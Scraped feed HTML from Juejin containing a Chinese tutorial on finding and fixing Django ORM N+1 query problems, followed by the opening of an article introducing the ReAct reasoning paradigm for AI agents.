data-draft-id="7603195960255479808" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="django n+1查询问题优化指南"/> <meta itemprop="keywords" content="Django,性能优化"/> <meta itemprop="datePublished" content="2026-02-06T01:02:40.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="哈里谢顿"/> <meta itemprop="url" content="https://juejin.cn/user/3678304397695056"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            django n+1查询问题优化指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3678304397695056/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    哈里谢顿
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-06T01:02:40.000Z" title="Fri Feb 06 2026 01:02:40 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一、什么是 N+1 查询问题？</h2>
<h3 data-id="heading-1">📌 场景示例</h3>
<p>假设你有以下模型：</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># models.py</span>
class Author(models.Model):
    <span class="hljs-attr">name</span> = models.CharField(max_length=<span class="hljs-number">100</span>)

class Book(models.Model):
    <span class="hljs-attr">title</span> = models.CharField(max_length=<span class="hljs-number">100</span>)
    <span class="hljs-attr">author</span> = models.ForeignKey(Author, <span class="hljs-literal">on</span>_delete=models.CASCADE)
</code></pre>
<p>现在你想在模板中列出所有书籍及其作者：</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># views.py</span>
<span class="hljs-attr">books</span> = Book.objects.all()
</code></pre>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- template.html --&gt;</span>
{% for book in books %}
  <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>{{ book.title }} by {{ book.author.name }}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
{% endfor %}
</code></pre>
<h3 data-id="heading-2">🔍 发生了什么？</h3>
<ul>
<li><strong>1 次查询</strong>：<code>SELECT * FROM book;</code>（获取所有书籍）</li>
<li><strong>N 次查询</strong>：对每本书，执行 <code>SELECT * FROM author WHERE id = ?;</code>（获取作者）</li>
</ul>
<p>如果 <code>books</code> 有 100 条记录 → <strong>总共 101 次数据库查询！</strong></p>
<blockquote>
<p>✅ 这就是 <strong>N+1 问题</strong>：1 次主查询 + N 次关联查询。</p>
</blockquote>
<hr/>
<h2 data-id="heading-3">二、如何诊断 N+1 问题？</h2>
<h3 data-id="heading-4">方法 1：使用 <code>django.db.connection.queries</code></h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> django.db <span class="hljs-keyword">import</span> connection

books = Book.objects.<span class="hljs-built_in">all</span>()
<span class="hljs-keyword">for</span> book <span class="hljs-keyword">in</span> books:
    <span class="hljs-built_in">print</span>(book.author.name)

<span class="hljs-built_in">print</span>(<span class="hljs-string">f"Total queries: <span class="hljs-subst">{<span class="hljs-built_in">len</span>(connection.queries)}</span>"</span>)
</code></pre>
<blockquote>
<p>⚠️ 注意：需关闭 <code>DEBUG=False</code> 或手动启用：</p>
<pre><code class="hljs language-ini" lang="ini">from django.conf import settings
<span class="hljs-attr">settings.DEBUG</span> = <span class="hljs-literal">True</span>
</code></pre>
</blockquote>
<h3 data-id="heading-5">方法 2：使用 Django Debug Toolbar（开发环境必备）</h3>
<ul>
<li>安装后，页面底部显示 SQL 查询次数和内容</li>
<li>红色高亮重复查询</li>
</ul>
<h3 data-id="heading-6">方法 3：日志监控（生产环境）</h3>
<p>配置数据库日志，观察短时间内的高频相似查询。</p>
<hr/>
<h2 data-id="heading-7">三、解决方案（按场景分类）</h2>
<hr/>
<h3 data-id="heading-8">✅ 方案 1：使用 <code>select_related()</code>（适用于 <strong>ForeignKey / OneToOne</strong>）</h3>
<blockquote>
<p><strong>原理</strong>：通过 <strong>JOIN</strong> 在一次查询中获取关联对象。</p>
</blockquote>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 修复前（N+1）</span>
<span class="hljs-attr">books</span> = Book.objects.all()

<span class="hljs-comment"># 修复后（1 次查询）</span>
<span class="hljs-attr">books</span> = Book.objects.select_related(<span class="hljs-string">'author'</span>)
</code></pre>
<p>生成 SQL：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">SELECT</span> book.<span class="hljs-operator">*</span>, author.<span class="hljs-operator">*</span>
<span class="hljs-keyword">FROM</span> book
<span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">OUTER</span> <span class="hljs-keyword">JOIN</span> author <span class="hljs-keyword">ON</span> book.author_id <span class="hljs-operator">=</span> author.id;
</code></pre>
<h4 data-id="heading-9">支持多层关联：</h4>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 获取书籍 → 作者 → 作者的国家</span>
<span class="hljs-attr">books</span> = Book.objects.select_related(<span class="hljs-string">'author__country'</span>)
</code></pre>
<blockquote>
<p>✅ 适用关系：<strong>正向 ForeignKey、OneToOneField</strong></p>
</blockquote>
<hr/>
<h3 data-id="heading-10">✅ 方案 2：使用 <code>prefetch_related()</code>（适用于 <strong>反向 ForeignKey / ManyToMany</strong>）</h3>
<blockquote>
<p><strong>原理</strong>：先查主表，再用 <strong>IN 查询</strong> 一次性获取所有关联对象，然后在 Python 中“拼接”。</p>
</blockquote>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># models.py</span>
class Publisher(models.Model):
    <span class="hljs-attr">name</span> = models.CharField(max_length=<span class="hljs-number">100</span>)

class Book(models.Model):
    <span class="hljs-attr">title</span> = = models.CharField(max_length=<span class="hljs-number">100</span>)
    <span class="hljs-attr">publisher</span> = models.ForeignKey(Publisher, <span class="hljs-literal">on</span>_delete=models.CASCADE)
</code></pre>
<p>想列出每个出版社及其所有书籍：</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 视图</span>
<span class="hljs-attr">publishers</span> = Publisher.objects.prefetch_related(<span class="hljs-string">'book_set'</span>)
</code></pre>
<pre><code class="hljs language-css" lang="css">{% for publisher in publishers %}
  &lt;<span class="hljs-selector-tag">h3</span>&gt;{{ publisher<span class="hljs-selector-class">.name</span> }}&lt;/<span class="hljs-selector-tag">h3</span>&gt;
  &lt;<span class="hljs-selector-tag">ul</span>&gt;
    {% for book in publisher<span class="hljs-selector-class">.book_set</span><span class="hljs-selector-class">.all</span> %}
      &lt;<span class="hljs-selector-tag">li</span>&gt;{{ book<span class="hljs-selector-class">.title</span> }}&lt;/<span class="hljs-selector-tag">li</span>&gt;
    {% endfor %}
  &lt;/<span class="hljs-selector-tag">ul</span>&gt;
{% endfor %}
</code></pre>
<blockquote>
<p>✅ 只产生 <strong>2 次查询</strong>：</p>
<ol>
<li><code>SELECT * FROM publisher;</code></li>
<li><code>SELECT * FROM book WHERE publisher_id IN (1, 2, 3, ...);</code></li>
</ol>
</blockquote>
<h4 data-id="heading-11">支持复杂预取：</h4>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 预取多层 + 过滤</span>
<span class="hljs-attr">publishers</span> = Publisher.objects.prefetch_related(
    Prefetch('book_set', <span class="hljs-attr">queryset</span>=Book.objects.filter(title__icontains=<span class="hljs-string">'Django'</span>))
)
</code></pre>
<blockquote>
<p>✅ 适用关系：<strong>反向 ForeignKey、ManyToManyField、GenericForeignKey</strong></p>
</blockquote>
<hr/>
<h3 data-id="heading-12">✅ 方案 3：组合使用 <code>select_related</code> + <code>prefetch_related</code></h3>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 书籍 → 作者（FK） + 标签（M2M）</span>
<span class="hljs-attr">books</span> = Book.objects.select_related(<span class="hljs-string">'author'</span>).prefetch_related(<span class="hljs-string">'tags'</span>)
</code></pre>
<hr/>
<h3 data-id="heading-13">✅ 方案 4：使用 <code>Prefetch</code> 对象精细控制</h3>
<pre><code class="hljs language-ini" lang="ini">from django.db.models import Prefetch

<span class="hljs-attr">books</span> = Book.objects.prefetch_related(
    Prefetch(
        'author',
        <span class="hljs-attr">queryset</span>=Author.objects.<span class="hljs-literal">on</span>ly(<span class="hljs-string">'id'</span>, <span class="hljs-string">'name'</span>)  <span class="hljs-comment"># 只取必要字段</span>
    )
)
</code></pre>
<p>避免加载大字段（如 <code>bio</code>、<code>avatar</code>），提升性能。</p>
<hr/>
<h3 data-id="heading-14">✅ 方案 5：在序列化器中处理（DRF 场景）</h3>
<p>如果你用 Django REST Framework：</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># serializers.py</span>
class BookSerializer(serializers.ModelSerializer):
    <span class="hljs-attr">author</span> = AuthorSerializer()  <span class="hljs-comment"># 默认会触发 N+1！</span>

    class Meta:
        <span class="hljs-attr">model</span> = Book
        <span class="hljs-attr">fields</span> = [<span class="hljs-string">'id'</span>, <span class="hljs-string">'title'</span>, <span class="hljs-string">'author'</span>]
</code></pre>
<p><strong>修复方式</strong>：</p>
<ul>
<li>
<p>在 ViewSet 中重写 <code>get_queryset</code>：</p>
<pre><code class="hljs language-ruby" lang="ruby"><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_queryset</span>(<span class="hljs-params"><span class="hljs-variable language_">self</span></span>):
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Book</span>.objects.select_related(<span class="hljs-string">'author'</span>)
</code></pre>
</li>
<li>
<p>或使用 <code>to_representation</code> 缓存（不推荐）</p>
</li>
</ul>
<blockquote>
<p>💡 更高级方案：使用 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fyezyilomo%2Fdjango-restql" target="_blank" title="https://github.com/yezyilomo/django-restql" ref="nofollow noopener noreferrer"><code>django-restql</code></a> 支持动态字段 + 自动优化。</p>
</blockquote>
<hr/>
<h2 data-id="heading-15">四、高级技巧与陷阱规避</h2>
<h3 data-id="heading-16">🔸 技巧 1：只取需要的字段（<code>only()</code> / <code>defer()</code>）</h3>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 不要 SELECT *</span>
<span class="hljs-attr">books</span> = Book.objects.select_related(<span class="hljs-string">'author'</span>).<span class="hljs-literal">on</span>ly(
    'title', 'author__name'
)
</code></pre>
<p>减少网络传输和内存占用。</p>
<hr/>
<h3 data-id="heading-17">🔸 技巧 2：避免在循环中触发查询</h3>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># ❌ 危险！</span>
for book in Book.objects.all():
    if <span class="hljs-attr">book.author.name</span> == <span class="hljs-string">"Alice"</span>:  <span class="hljs-comment"># 每次都查 DB！</span>
        ...

<span class="hljs-comment"># ✅ 正确</span>
for book in Book.objects.select_related('author'):
    if <span class="hljs-attr">book.author.name</span> == <span class="hljs-string">"Alice"</span>:
        ...
</code></pre>
<hr/>
<h3 data-id="heading-18">🔸 陷阱 1：<code>prefetch_related</code> 后不能再链式过滤</h3>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># ❌ 无效！会重新查询</span>
<span class="hljs-attr">books</span> = Book.objects.prefetch_related(<span class="hljs-string">'tags'</span>)
for book in books:
    book.tags.filter(<span class="hljs-attr">name</span>=<span class="hljs-string">'Python'</span>)  <span class="hljs-comment"># 忽略 prefetch，发起新查询！</span>

<span class="hljs-comment"># ✅ 正确：在 Prefetch 中过滤</span>
<span class="hljs-attr">books</span> = Book.objects.prefetch_related(
    Prefetch('tags', <span class="hljs-attr">queryset</span>=Tag.objects.filter(name=<span class="hljs-string">'Python'</span>))
)
</code></pre>
<hr/>
<h3 data-id="heading-19">🔸 陷阱 2：<code>select_related</code> 不适用于反向关系</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ❌ 无效</span>
Author.objects.select_related(<span class="hljs-string">'book'</span>)  <span class="hljs-comment"># Book 是反向 FK</span>

<span class="hljs-comment"># ✅ 应用 prefetch_related</span>
Author.objects.prefetch_related(<span class="hljs-string">'book_set'</span>)
</code></pre>
<hr/>
<h2 data-id="heading-20">五、自动化检测工具</h2>
<h3 data-id="heading-21">1. <strong><code>nplusone</code></strong>（强烈推荐！）</h3>
<p>自动检测 N+1 并抛出警告或异常。</p>
<p>安装：</p>
<pre><code class="hljs">pip install nplusone
</code></pre>
<p>配置 <code>settings.py</code>：</p>
<pre><code class="hljs language-ini" lang="ini">INSTALLED_APPS += <span class="hljs-section">['nplusone.ext.django']</span>
MIDDLEWARE += <span class="hljs-section">['nplusone.ext.django.NPlusOneMiddleware']</span>

<span class="hljs-attr">NPLUSONE_RAISE</span> = <span class="hljs-literal">True</span>  <span class="hljs-comment"># 开发环境直接报错</span>
</code></pre>
<blockquote>
<p>✅ 效果：一旦出现 N+1，立即抛出 <code>NPlusOneError</code>，强制修复！</p>
</blockquote>
<hr/>
<h3 data-id="heading-22">2. <strong>Django Debug Toolbar</strong></h3>
<p>可视化查看所有 SQL 查询，高亮重复语句。</p>
<hr/>
<h2 data-id="heading-23">六、总结：最佳实践清单</h2>





































<table><thead><tr><th>场景</th><th>推荐方法</th></tr></thead><tbody><tr><td><strong>正向 ForeignKey / OneToOne</strong></td><td><code>select_related()</code></td></tr><tr><td><strong>反向 ForeignKey / ManyToMany</strong></td><td><code>prefetch_related()</code></td></tr><tr><td><strong>需要过滤关联对象</strong></td><td><code>Prefetch(queryset=...)</code></td></tr><tr><td><strong>只取部分字段</strong></td><td>结合 <code>only()</code></td></tr><tr><td><strong>DRF 序列化</strong></td><td>在 <code>get_queryset</code> 中优化</td></tr><tr><td><strong>开发阶段</strong></td><td>启用 <code>nplusone</code> + Debug Toolbar</td></tr><tr><td><strong>生产监控</strong></td><td>记录 SQL 查询次数，设置告警</td></tr></tbody></table>
<blockquote>
<p>💡 <strong>黄金法则</strong>：<br/>
<strong>“永远不要在循环中访问关联对象，除非你确定它已被预取。”</strong></p>
</blockquote>
<hr/>
<h2 data-id="heading-24">七、延伸阅读</h2>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.djangoproject.com%2Fen%2Fstable%2Ftopics%2Fdb%2Foptimization%2F" target="_blank" title="https://docs.djangoproject.com/en/stable/topics/db/optimization/" ref="nofollow noopener noreferrer">Django 官方文档：Database access optimization</a></li>
<li>《Two Scoops of Django》第 9 章：QuerySets</li>
<li>GitHub: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fjmcarp%2Fnplusone" target="_blank" title="https://github.com/jmcarp/nplusone" ref="nofollow noopener noreferrer"><code>nplusone</code></a></li>
</ul>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[春哥的Agent通关秘籍06：你的第一款AI 思维范式ReAct]]></title>    <link>https://juejin.cn/post/7603252259560521764</link>    <guid>https://juejin.cn/post/7603252259560521764</guid>    <pubDate>2026-02-05T23:36:54.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603252259560521764" data-draft-id="7603252259560505380" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="春哥的Agent通关秘籍06：你的第一款AI 思维范式ReAct"/> <meta itemprop="keywords" content="前端,后端,JavaScript"/> <meta itemprop="datePublished" content="2026-02-05T23:36:54.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="摸鱼的春哥"/> <meta itemprop="url" content="https://juejin.cn/user/1714893870865303"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            春哥的Agent通关秘籍06：你的第一款AI 思维范式ReAct
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1714893870865303/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    摸鱼的春哥
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T23:36:54.000Z" title="Thu Feb 05 2026 23:36:54 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">06、你的第一款AI 思维范式：ReAct</h2>
<p>都2026年了，还有人在说 AI 不会算数？</p>
<p>那他的知识结构已经落伍了！</p>
<h3 data-id="heading-1">一、链接LLM和Function的桥梁：思维范式</h3>
<p>大语言模型（LLM）的出厂设置其实是一个“接龙机器”。</p>
<p>如果你问它：“23 乘以 45 等于多少？”</p>
<p>它并不是像计算器那样在后台运算，而是根据概率在“猜”下一个字是什么。这更像人类的直觉，这导致它经常一本正经地胡说八道。</p>
<p>这就是幻觉问题的根本所在，也是为什么幻觉问题难以解决的原因所在。</p>
<p>思维范式的出现，就是为了强行把 AI 的这种“直觉”拉回到 <strong>“逻辑推演”</strong> 上来。</p>
<h3 data-id="heading-2">二、什么是【思维范式】？</h3>
<p>思维范式就是一套强制性的规定，它规定了 AI 在回答问题之前，必须遵循的思考路径和格式结构。</p>
<p>简单来说，拒绝AI <strong>想到啥说啥</strong>。</p>
<p>它规定了 AI 在回答问题之前，必须遵循的思考路径和格式结构：</p>
<blockquote>
<p>输入 -&gt; 特定结构的思考流程 -&gt; 输出</p>
</blockquote>
<p>这里，我们举个例子：</p>
<p><img src="https://pic.zhangshichun.top/pic/20260205204749058.png" alt="" loading="lazy"/></p>
<p>上图这个示意图，解释了【无范式】和【有范式】的AI，在面对计算题时的根本行为差异。</p>
<h3 data-id="heading-3">三、一个标准的“思维范式”包含什么？</h3>
<p>在 Agent 开发中，当我们说我们采用了一种范式（比如 ReAct），意味着我们在代码和提示词里规定了以下三点：</p>
<ul>
<li>
<p>特定的步骤（Process）： 规定脑子怎么转。是线性的（一步步想）？还是循环的（想-做-想-做）？还是树状的（想出三个方案选一个）？</p>
</li>
<li>
<p>特定的关键词（Keywords）： 规定嘴巴怎么说。必须说 Thought:，必须说 Action:。这不仅是给人看的，更是为了方便程序抓取和解析。</p>
</li>
<li>
<p>特定的约束（Constraints）： 规定什么不能做。比如“在没有得到 Observation 之前，不许给出 Final Answer”。</p>
</li>
</ul>
